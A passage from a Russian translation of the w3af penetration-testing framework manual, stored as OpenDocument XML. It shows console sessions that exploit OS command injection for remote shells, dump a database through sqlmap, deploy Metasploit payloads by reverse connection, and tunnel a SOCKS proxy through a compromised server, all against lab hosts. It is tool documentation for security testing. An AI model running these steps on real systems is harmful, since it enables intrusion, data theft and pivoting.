        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">target</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/config:target&gt;&gt;&gt;</text:span><text:span text:style-name="T24">set target</text:span></text:p>
        <text:p text:style-name="P34">http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/config:target&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">start</text:span></text:p>
        <text:p text:style-name="P34">Found 1 URLs and 1 different points of injection.</text:p>
        <text:p text:style-name="P34">The list of URLs is:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/osCommanding/vulnerable.php</text:p>
        <text:p text:style-name="P34">The list of fuzzable requests is:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/osCommanding/vulnerable.php | Method:</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>GET | Parameters: (command)</text:p>
        <text:p text:style-name="P34">Starting osCommanding plugin execution.</text:p>
        <text:p text:style-name="P34">OS Commanding was found at: "http://localhost/w3af/osCommanding/</text:p>
        <text:p text:style-name="P34">vulnerable.php", using HTTP method GET. The sent data was:</text:p>
        <text:p text:style-name="P34">"command=+ping+c+</text:p>
        <text:p text:style-name="P34">9+localhost". The vulnerability was found in</text:p>
        <text:p text:style-name="P34">the request with id 5.</text:p>
        <text:p text:style-name="P34">Finished scanning process.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">exploit</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt;</text:span><text:span text:style-name="T24">exploit osCommandingShell</text:span></text:p>
        <text:p text:style-name="P34">osCommandingShell exploit plugin is starting.</text:p>
        <text:p text:style-name="P34">The vulnerability was found using method GET, tried to change</text:p>
        <text:p text:style-name="P34">the method to POST for exploiting but failed.</text:p>
        <text:p text:style-name="P34">Vulnerability successfully exploited. This is a list of</text:p>
        <text:p text:style-name="P34">available shells:</text:p>
        <text:p text:style-name="P34">[0] &lt;osCommandingShell object (ruser: "wwwdata"| rsystem:"Linux brick 2.6.2419generic</text:p>
        <text:p text:style-name="P34">i686 GNU/Linux")&gt;Please use the interact command to interact with the shell</text:p>
        <text:p text:style-name="P34">objects.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt;</text:span><text:span text:style-name="T24">interact 0</text:span></text:p>
        <text:p text:style-name="P34">Execute "endInteraction" to get out of the remote shell.</text:p>
        <text:p text:style-name="P34">Commands typed in this menu will be runned on the remote web</text:p>
        <text:p text:style-name="P34">server.</text:p>
        <text:p text:style-name="P33">w3af/exploit/osCommandingShell0&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P34">ls</text:p>
        <text:p text:style-name="P34">vulnerable.php</text:p>
        <text:p text:style-name="P34">vulnerable2.php</text:p>
        <text:p text:style-name="P34">w3afAgentClient.log</text:p>
        <text:p text:style-name="P33">w3af/exploit/osCommandingShell0&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P34">endInteraction</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P33">w3af&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P16"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Второй путь заключается в том, чтобы вручную запустить exploit-плагин. Данный метод может пригодится когда пользователь самостоятельно нашёл уязвимость, но её эксплуатацию по каким-то причинам хочет провести с помощью фреймворка. </text:span></text:p>
        <text:p text:style-name="P16"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">exploit</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt; </text:span><text:span text:style-name="T24">exploit config sqlmap</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugin/sqlmap&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set url http://localhost/w3af/blindSqli/blindSqliinteger.php</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugin/sqlmap&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set injvar id</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugin/sqlmap&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set data id=1</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugin/sqlmap&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt; </text:span><text:span text:style-name="T24">fastexploit sqlmap</text:span></text:p>
        <text:p text:style-name="P34">sqlmap coded by inquis &lt;bernardo.damele@gmail.com&gt; and belch</text:p>
        <text:p text:style-name="P34">&lt;daniele.bellucci@gmail.com&gt;</text:p>
        <text:p text:style-name="P34">SQL injection could be verified, trying to create the DB driver.</text:p>
        <text:p text:style-name="P34">Execute "exitPlugin" to get out of the remote shell. Commands</text:p>
        <text:p text:style-name="P34">typed in this menu will be runned on the remote web server.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit/sqlmap&gt;&gt;&gt; </text:span><text:span text:style-name="T24">dump agenda w3af_test</text:span></text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>Database: w3af_test</text:p>
        <text:p text:style-name="P34">Table: agenda</text:p>
        <text:p text:style-name="P34">[2 entries]</text:p>
        <text:p text:style-name="P34">+----------------------------------------------------------------+</text:p>
        <text:p text:style-name="P34">+------------------+ ---+-----------+------------+------------+</text:p>
        <text:p text:style-name="P34">| direccion <text:s text:c="7"/>| id <text:s/>| nombre | telefono <text:s/>| email <text:s text:c="5"/>|</text:p>
        <text:p text:style-name="P34">+----------------------------------------------------------------+</text:p>
        <text:p text:style-name="P34">+------------------+ ---+-----------+------------+------------+</text:p>
        <text:p text:style-name="P34">| direccion 123 | 1 | apr | 52365786 | acho@c.com |</text:p>
        <text:p text:style-name="P34">| direccion 333 | 2 | vico | 47998123 | vTro@c.com |</text:p>
        <text:p text:style-name="P34">+----------------------------------------------------------------+</text:p>
        <text:p text:style-name="P34">+------------------+ ---+-----------+------------+------------+</text:p>
        <text:p text:style-name="P33">w3af/exploit/sqlmap&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P16"/>
        <text:p text:style-name="Heading_20_1">Продвинутая техника эксплуатации уязвимостей</text:p>
        <text:p text:style-name="P11">В фреймворке реализует две продвинутые техники использования уязвимостей. Они основаны на возможности фреймворка выполнять удалённо команды системы с помощью плагинов «remoteFileIncludeShell» и «davShell». Эти техники основаны на:</text:p>
        <text:list xml:id="list1814967193" text:style-name="WW8Num6">
          <text:list-item>
            <text:p text:style-name="P29"><text:span text:style-name="T21">Виртуальном демоне</text:span><text:span text:style-name="T20"> позволяющем выполнять код, сгенерированный </text:span><text:span text:style-name="T20">Metasploit</text:span><text:span text:style-name="T20">`ом, на удалённом сервере.</text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P29"><text:span text:style-name="T20">w3afAgent, позволяющем создать </text:span><text:span text:style-name="T20">SOCKS</text:span><text:span text:style-name="T20">-прокси на удалённом сервере.</text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Обе из них просты в использовании и настройке. Но они пока что плохо проработаны и не факт что у Вас будут работать стабильно. В случае их использования вы действуйте на свой страх и риск.</text:p>
        <text:p text:style-name="P16"/>
        <text:p text:style-name="Heading_20_1">Виртуальный демон</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T23">Как было сказано выше, эта техника позволяет Вам выполнять код сгенерированный </text:span><text:span text:style-name="T23">Metasploit</text:span><text:span text:style-name="T23">`ом для компрометации атакуемого сервера. Чтобы её использовать требуется иметь на машине установленным </text:span><text:span text:style-name="T23">Metasploit</text:span><text:span text:style-name="T23"> </text:span><text:span text:style-name="T23">Framework</text:span><text:span text:style-name="T23"> версии 3.0 и выше. вы можете скачать его бесплатно на сайте www.metasploit.com. Установка и настройка </text:span><text:span text:style-name="T23">MSF</text:span><text:span text:style-name="T23"> выходят за пределы этого документа. </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T23">Для активации использования виртуального демона Вам нужно запустить следующую команду, скопировав прежде </text:span><text:span text:style-name="T23">metasploit</text:span><text:span text:style-name="T23">-модуль </text:span><text:span text:style-name="T23">w</text:span><text:span text:style-name="T23">3</text:span><text:span text:style-name="T23">af</text:span><text:span text:style-name="T23"> в директорию </text:span><text:span text:style-name="T23">MSF</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">./w3af_console -i /home/jdoe/tools/msf/</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Где “</text:span><text:span text:style-name="T24">/home/jdoe/tools/msf/</text:span><text:span text:style-name="T20">” это директория куда пользователь “jdoe” установил</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Metasploit. Далее скопируйте модуль для работы с </text:span><text:span text:style-name="T20">MSF</text:span><text:span text:style-name="T20"> в его специальную директорию.</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">cp core/controllers/vdaemon/w3af_vdaemon.rb /home/user/tools/msf/modules/exploits/unix/misc/</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Как только это сделано, атакующий может начинать пользоваться виртуальным демоном. Для того чтобы вы поняли как это делается рассмотрим следующий пример:</text:p>
        <text:p text:style-name="P11"><text:soft-page-break/></text:p>
        <text:p text:style-name="P32">1. w3af нашёл уязвимость, которая позволяет удалённо выполнять команды ОС на атакуемом сервере</text:p>
        <text:p text:style-name="P32">2. Взломщик, через использование этой уязвимости, запускает виртуальный демон.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T20">3. Запускает </text:span><text:span text:style-name="T20">MSF</text:span></text:p>
        <text:p text:style-name="P32">4. Настраивает модуль w3af, находящийся внутри MSF и выполняет его</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T20">5. w3af-модуль внутри MSF соединяется с виртуальным демоном который прослушивает определённый порт на </text:span><text:span text:style-name="T20">localhost</text:span><text:span text:style-name="T20">`е. </text:span></text:p>
        <text:p text:style-name="P32">6. MSF посылает код, выбранный пользователем, виртуальному демону. </text:p>
        <text:p text:style-name="P32">7. Демон создаёт PE или ELF — файл, в зависимости от удалённой операционной системы, и с использованием уязвимости этот код загружается на атакованный сервер и выполняется.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T20">8. Процесс загрузки файла на сервер зависит от удалённой операционной системы, привилегий пользователя запустившего </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> и локальной ОС. Далее происходит следующее:</text:span></text:p>
        <text:p text:style-name="P32"><text:tab/>1. w3af посылает небольшой исполняемый файл удалённому серверу.</text:p>
        <text:p text:style-name="P32"><text:tab/>2. Затем фреймворк получает имя сетевого интерфейса ( misc-settings -&gt; interface ) и отсылает на определённые порты несколько пакетов. Так он определяет разрешены ли такие соединения файрволом удалённой сети. </text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T20"><text:tab/>3. Если какой-либо TCP-порт оказывается разрешённым, w3af пытается запустить сервер на этом порту и осуществляет </text:span><text:span text:style-name="T20">back</text:span><text:span text:style-name="T20">-</text:span><text:span text:style-name="T20">connect</text:span><text:span text:style-name="T20"> с удалённого хоста для загрузки созданного </text:span><text:span text:style-name="T20">PE</text:span><text:span text:style-name="T20">/</text:span><text:span text:style-name="T20">ELF</text:span><text:span text:style-name="T20"> — файла. Если такого порта нет то </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> записывает </text:span><text:span text:style-name="T20">PE</text:span><text:span text:style-name="T20">/</text:span><text:span text:style-name="T20">ELF</text:span><text:span text:style-name="T20"> – файл <text:s/>используя команду «</text:span><text:span text:style-name="T20">echo</text:span><text:span text:style-name="T20">». Этот способ самый медленный, но он всегда работает.</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T20">9. Загруженный код выполняется на удалённом сервере и соединяется с </text:span><text:span text:style-name="T20">MSF</text:span><text:span text:style-name="T20">.</text:span></text:p>
        <text:p text:style-name="P32"/>
        <text:p text:style-name="P11">Теперь, когда мы знаем этот процесс в теории, давайте рассмотрим иллюстрацию практического примера.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">./w3af_console</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">audit osCommanding</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">audit</text:span></text:p>
        <text:p text:style-name="P34">Enabled audit plugins:</text:p>
        <text:p text:style-name="P34">osCommanding</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">target</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set target http://172.16.1.128/os.php?cmd=f00</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">start</text:span></text:p>
        <text:p text:style-name="P34">The list of found URLs is:</text:p>
        <text:p text:style-name="P34">http://172.16.1.128/os.php</text:p>
        <text:p text:style-name="P34">Found 1 URLs and 1 different points of injection.</text:p>
        <text:p text:style-name="P34">The list of Fuzzable requests is:</text:p>
        <text:p text:style-name="P34">http://172.16.1.128/os.php | Method: GET | Parameters: (cmd)</text:p>
        <text:p text:style-name="P34">Starting osCommanding plugin execution.</text:p>
        <text:p text:style-name="P34">OS Commanding was found at: http://172.16.1.128/os.php . Using</text:p>
        <text:p text:style-name="P34">method: GET. The data sent was: cmd=type+%25SYSTEMROOT</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>%25%5Cwin.ini The vulnerability was found in the request with id 7.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">exploit</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt; </text:span><text:span text:style-name="T24">exploit osCommandingShell</text:span></text:p>
        <text:p text:style-name="P34">osCommanding exploit plugin is starting.</text:p>
        <text:p text:style-name="P34">The vulnerability was found using method GET, tried to change</text:p>
        <text:p text:style-name="P34">the method to POST for exploiting but failed.</text:p>
        <text:p text:style-name="P34">Vulnerability successfully exploited.</text:p>
        <text:p text:style-name="P34">Execute "exitPlugin" to get out of the remote shell. Commands</text:p>
        <text:p text:style-name="P34">typed in this menu will be runned on the remote web server.</text:p>
        <text:p text:style-name="P33">w3af/exploit/osCommandingShell&gt;&gt;&gt; start vdaemon</text:p>
        <text:p text:style-name="P34">Virtual daemon service is running on port 9091, use metasploit's</text:p>
        <text:p text:style-name="P34">w3af_vdaemon module to exploit it.</text:p>
        <text:p text:style-name="P33">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Ничего</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">особенного</text:span><text:span text:style-name="T20">. </text:span><text:span text:style-name="T20">Только добавилась новая команда «</text:span><text:span text:style-name="T20">start</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">daemon</text:span><text:span text:style-name="T20">». Этот пример отражает пункты 1 и 2 из теоретической части. Следующая часть — конфигурация </text:span><text:span text:style-name="T20">MSF</text:span><text:span text:style-name="T20">-модуля и его запуск. Я больше предпочитаю веб-интерфейс «msfweb». Первым делом нужно выбрать пункт «</text:span><text:span text:style-name="T20">Exploit</text:span><text:span text:style-name="T20">» в главном меню. Появится маленькое окошко, в котором вы должны произвести поиск по выражению «</text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20">» и выбрать эксплоит с именем “w3af virtual daemon exploit”. </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Несколько важных особенностей которые вы должны знать при настройке «</text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">agent</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">virtual</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">daemon</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">module</text:span><text:span text:style-name="T20">» в </text:span><text:span text:style-name="T20">MSF</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:p text:style-name="P11">1. В качестве цели должна быть указана именно та система, с которой вы работаете. </text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21">2.</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T21">Не работать с </text:span><text:span text:style-name="T20">VNC (скорее всего это переведено неверно, вот исходное выражение «VNC payloads don't seem to work»)</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21">3. </text:span><text:span text:style-name="T20">RHOST - параметр должен содержать </text:span><text:span text:style-name="T20">IP</text:span><text:span text:style-name="T20"> атакуемого хоста</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21">4. </text:span><text:span text:style-name="T20">LHOST - это Ваш внешний </text:span><text:span text:style-name="T20">IP</text:span><text:span text:style-name="T20">-адрес</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21">5. </text:span><text:span text:style-name="T20">LPORT — это порт на Вашей машине, куда удалённый веб-сервер может подключится. Или куда можете обращаться вы.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21">6. </text:span><text:span text:style-name="T20">w3af-модуль внутри </text:span><text:span text:style-name="T20">MSF</text:span><text:span text:style-name="T20"> соединится с адресом localhost:9091 и произведёт передачу данных. Этот параметр не может быть изменён и не должен совпадать с </text:span><text:span text:style-name="T20">LHOST</text:span><text:span text:style-name="T20"> и </text:span><text:span text:style-name="T20">LPORT</text:span><text:span text:style-name="T20">.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Когда всё это будет настроено мы можем кликнуть по кнопке «</text:span><text:span text:style-name="T20">Launch</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">Exploit</text:span><text:span text:style-name="T20">». Вот что мы при этом увидим в консоли </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w</text:span><text:span text:style-name="T23">3</text:span><text:span text:style-name="T23">af</text:span><text:span text:style-name="T23">/</text:span><text:span text:style-name="T23">exploit</text:span><text:span text:style-name="T23">/</text:span><text:span text:style-name="T23">osCommandingShell</text:span><text:span text:style-name="T23">&gt;&gt;&gt;</text:span></text:p>
        <text:p text:style-name="P34">Please wait some seconds while w3af performs an extrusion scan.</text:p>
        <text:p text:style-name="P34">The extrusion test failed, no reverse connect transfer methods</text:p>
        <text:p text:style-name="P34">can be used. Trying inband echo transfer method.</text:p>
        <text:p text:style-name="P34">Error: The user running w3af can't sniff on the specified</text:p>
        <text:p text:style-name="P34">interface. Hints: Are you root? Does this interface exist?</text:p>
        <text:p text:style-name="P34">Successfully transfered the MSF payload to the remote server.</text:p>
        <text:p text:style-name="P34">Successfully executed the MSF payload on the remote server.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Последнее сообщение выведется только, если вы запускали </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> как обычный пользователь. Причина проста — не хватает прав на то чтобы произвести сканирование. Удачная</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">попытка</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">сканирования</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">выглядит</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">вот</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">так</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P32">Please wait some seconds while w3af performs an extrusion scan.</text:p>
        <text:p text:style-name="P32">ExtrusionServer listening on interface: eth1</text:p>
        <text:p text:style-name="P32"><text:soft-page-break/>Finished extrusion scan.</text:p>
        <text:p text:style-name="P32">The remote host: "172.10.10.1" can connect to w3af with these ports:</text:p>
        <text:p text:style-name="P32">25/TCP</text:p>
        <text:p text:style-name="P32">80/TCP</text:p>
        <text:p text:style-name="P32">53/TCP</text:p>
        <text:p text:style-name="P32">1433/TCP</text:p>
        <text:p text:style-name="P32">8080/TCP</text:p>
        <text:p text:style-name="P32">53/UDP</text:p>
        <text:p text:style-name="P32">69/UDP</text:p>
        <text:p text:style-name="P32">139/UDP</text:p>
        <text:p text:style-name="P32">1025/UDP</text:p>
        <text:p text:style-name="P32">The following ports are not bound to a local process and can be used by w3af:</text:p>
        <text:p text:style-name="P32">25/TCP</text:p>
        <text:p text:style-name="P32">53/TCP</text:p>
        <text:p text:style-name="P32">1433/TCP</text:p>
        <text:p text:style-name="P32">8080/TCP</text:p>
        <text:p text:style-name="P32">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">И если мы теперь посмотрим на веб-интерфейс </text:span><text:span text:style-name="T20">MSF</text:span><text:span text:style-name="T20"> то увидим там что ни будь интересное типа :</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P32">[*] Started reverse handler</text:p>
        <text:p text:style-name="P32">[*] The remote IP address is: 172.16.1.128</text:p>
        <text:p text:style-name="P32">[*] Using remote IP address to create payloads.</text:p>
        <text:p text:style-name="P32">[*] Sent payload to vdaemon.</text:p>
        <text:p text:style-name="P32">[*] The estimated time to wait for the extrusion scan to</text:p>
        <text:p text:style-name="P32">complete is: 1 seconds.</text:p>
        <text:p text:style-name="P32">[*] Done waiting!</text:p>
        <text:p text:style-name="P32">[*] The estimated time to wait for PE/ELF transfer is: 8</text:p>
        <text:p text:style-name="P32">seconds.</text:p>
        <text:p text:style-name="P32">[*] Waiting...</text:p>
        <text:p text:style-name="P32">[*] Done waiting!</text:p>
        <text:p text:style-name="P32">[*] Going to wait for 27 seconds (waiting for crontab/at to</text:p>
        <text:p text:style-name="P32">execute payload).</text:p>
        <text:p text:style-name="P32">[*] The session could start before the handler, so please *be</text:p>
        <text:p text:style-name="P32">patient*.</text:p>
        <text:p text:style-name="P32">[*] Command shell session 1 opened (172.16.1.1:4444 &gt;</text:p>
        <text:p text:style-name="P32">172.16.1.128:1047)</text:p>
        <text:p text:style-name="P32">[*] Done waiting!</text:p>
        <text:p text:style-name="P32">[*] Starting handler</text:p>
        <text:p text:style-name="P32">Microsoft Windows 2000 [Version 5.00.2195]</text:p>
        <text:p text:style-name="P32">(C) Copyright 19852000</text:p>
        <text:p text:style-name="P32">Microsoft Corp.</text:p>
        <text:p text:style-name="P32">C:\WINNT\system32&gt;</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Теперь пользователь имеет интерактивный шелл с привилегиями веб-сервера без всяческих ограничений. На этом этапе можно закрыть </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> и продолжить работу только с </text:span><text:span text:style-name="T20">MSF</text:span><text:span text:style-name="T20">. </text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1"><text:soft-page-break/>w3afAgent</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Как уже было сказано, </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">afAgent</text:span><text:span text:style-name="T20"> позволяет создать </text:span><text:span text:style-name="T20">SOCKS</text:span><text:span text:style-name="T20">-прокси (в оригинальном тексте он именуется как «туннель для проведения </text:span><text:span text:style-name="T20">TCP</text:span><text:span text:style-name="T20">-соединений через атакованный сервер», но ниже пишется прямо — </text:span><text:span text:style-name="T20">SOCKS</text:span><text:span text:style-name="T20">-</text:span><text:span text:style-name="T20">proxy</text:span><text:span text:style-name="T20"> – п.п.). В отличие от виртуального демона </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">afAgent</text:span><text:span text:style-name="T20"> не требует установки стороннего софта. Перед тем как рассмотреть пример использования этой технологии, мы теоретический алгоритм работы с ним. </text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">1. w3af находит уязвимость удалённого выполнения команд</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">2. Пользователь запускает </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">afAgent</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">3. w3af посылает небольшой исполняемый файл на удалённый сервер. После выполнения он соединяется с </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> и позволяет фреймворку проверить правила файрвола для исходящих соединений. </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">4. w3afAgent Manager загружает w3afAgentClient на удалённый сервер. Процесс загрузки файла на удалённый сервер зависит от типа удалённой ОС, привилегий под которыми запущен </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> и типа локальной ОС. Затем происходит следующее</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T21">● </text:span><text:span text:style-name="T20">w3af берёт информацию из первого сканирования, которое про ходило в шаге 3 для того чтобы узнать какой порт можно использовать для соединения с атакованным сервером.</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T21">● Если </text:span><text:span text:style-name="T20">TCP-порт найден, w3af попытается запустить сервер на нём и сделать обратное соединение для загрузки </text:span><text:span text:style-name="T20">PE</text:span><text:span text:style-name="T20">/</text:span><text:span text:style-name="T20">ELF</text:span><text:span text:style-name="T20"> файла. Если ни один ТСР-порт недоступен, </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> загружает </text:span><text:span text:style-name="T20">PE</text:span><text:span text:style-name="T20">/</text:span><text:span text:style-name="T20">ELF</text:span><text:span text:style-name="T20">-файл на удалённый сервер с помощью команды «</text:span><text:span text:style-name="T20">echo</text:span><text:span text:style-name="T20">». Этот способ самый медленный, но всегда срабатывает. </text:span></text:p>
        <text:p text:style-name="P11">5. w3afAgent Manager запускает w3afAgentServer на локальном хосте, порт 1080. И на интерфейсе указанном в misc-settings-&gt;interface, на порту который был найден в 3 шаге. </text:p>
        <text:p text:style-name="P11">6. The w3afAgentClient осуществляет обратное соединение к w3afAgentServer и создаёт туннель</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">7. Пользователь настраивает нужные программы на работу с </text:span><text:span text:style-name="T20">SOCKS</text:span><text:span text:style-name="T20">-прокси по адресу localhost:1080</text:span></text:p>
        <text:p text:style-name="P11">8. Когда программы будут соединятся с прокси-сервером, весь трафик будет идти через атакованный сервер.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Вот пример практической реализации:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">./w3af_console</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">audit osCommanding</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">audit</text:span></text:p>
        <text:p text:style-name="P34">Enabled audit plugins:</text:p>
